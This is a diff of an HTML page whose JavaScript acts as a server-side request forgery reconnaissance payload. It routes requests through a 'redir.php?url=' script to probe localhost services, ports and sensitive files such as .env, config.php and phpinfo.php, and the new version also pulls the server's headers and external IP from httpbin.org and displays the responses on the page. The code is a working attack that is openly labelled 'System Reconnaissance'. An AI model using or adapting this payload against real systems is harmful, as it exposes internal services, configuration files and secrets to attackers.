@@ -1,51 +1,45 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Internal Service Discovery</title>
+    <title>System Reconnaissance</title>
 </head>
 <body>
-    <h1>Scanning for Internal Services</h1>
+    <h1>🕵️ System Fingerprinting & Environment Detection</h1>
     <div id="results"></div>
     
     <script>
         var results = "";
         
-        // Test common internal services and ports
-        var targets = [
-            'http://localhost:80/',
-            'http://localhost:8080/',
-            'http://localhost:3000/',
-            'http://localhost:5000/',
-            'http://localhost:8000/',
-            'http://127.0.0.1:80/',
-            'http://127.0.0.1:8080/',
-            'http://0.0.0.0:80/',
-            'http://internal/',
-            'http://admin/',
-            'http://backend/',
-            'http://api/',
-            'http://management/',
-            'http://localhost/admin/',
-            'http://localhost/api/',
-            'http://localhost/internal/',
-            'http://localhost/management/',
-            'http://localhost/status/',
-            'http://localhost/health/',
-            'http://localhost/debug/',
-            'http://localhost/.env',
-            'http://localhost/config',
-            'http://localhost/config.php',
-            'http://localhost/phpinfo.php'
+        // Test 1: Gather server information via special endpoints
+        var infoEndpoints = [
+            'http://httpbin.org/headers',  // Baseline - see what headers the server sends
+            'http://httpbin.org/user-agent', // Server's user agent
+            'http://httpbin.org/ip',       // Server's external IP
+            // Try to get server info pages
+            'http://localhost/server-info',
+            'http://localhost/server-status', 
+            'http://localhost/info.php',
+            'http://localhost/phpinfo.php',
+            'http://localhost/test.php',
+            // Environment detection
+            'http://localhost/.well-known/security.txt',
+            'http://localhost/robots.txt',
+            'http://localhost/sitemap.xml'
         ];
         
-        for(var i = 0; i < targets.length; i++) {
+        for(var i = 0; i < infoEndpoints.length; i++) {
             try {
-                results += "<h3>Test " + (i+1) + ": " + targets[i] + "</h3>";
+                results += "<h3>🔍 " + infoEndpoints[i] + "</h3>";
                 var xhr = new XMLHttpRequest();
-                xhr.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(targets[i]), false);
+                xhr.open('GET', 'http://localhost/redir.php?url=' + infoEndpoints[i], false);
                 xhr.send();
-                results += "<div style='background:#e8f5e8;padding:10px;border:1px solid green;'>✅ SUCCESS: " + xhr.responseText.length + " bytes</div>";
-                results += "<div style='background:#f0f0f0;padding:10px;max-height:200px;overflow:scroll;font-size:10px;'>" + xhr.responseText.substring(0, 500) + "...</div>";
+                
+                if(xhr.responseText && xhr.responseText.length > 5) {
+                    results += "<div style='background:#e8f5e8;padding:10px;border:1px solid green;'>✅ " + xhr.responseText.length + " bytes</div>";
+                    results += "<div style='background:#f0f0f0;padding:10px;max-height:150px;overflow:scroll;font-size:10px;white-space:pre-wrap;'>" + xhr.responseText.substring(0, 800) + "</div>";
+                } else {
+                    results += "<div style='background:#ffe8e8;padding:3px;'>❌ No useful response</div>";
+                }
             } catch(e) {
                 results += "<div style='background:#ffe8e8;padding:3px;'>❌ " + e.message + "</div>";
             }
